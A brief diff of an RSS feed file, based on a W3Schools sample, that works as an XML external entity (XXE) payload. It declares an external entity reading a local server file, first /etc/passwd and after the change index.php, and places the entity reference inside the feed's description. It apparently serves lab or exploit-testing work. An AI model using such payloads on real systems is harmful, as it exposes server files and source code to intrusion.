@@ -1,14 +1,14 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE data [
 <!ELEMENT channel ANY>
-<!ENTITY file SYSTEM "file:///etc/passwd">
+<!ENTITY file SYSTEM "file://index.php">
 ]>
 <rss version="2.0">
 
 <channel>
   <title>W3Schools Home Page</title>
   <link>https://www.w3schools.com</link>
-  <description>work</description>
+  <description><![CDATA[&file;]]></description>
   <item>
     <title>RSS Tutorial</title>
     <link>https://www.w3schools.com/xml/xml_rss.asp</link>
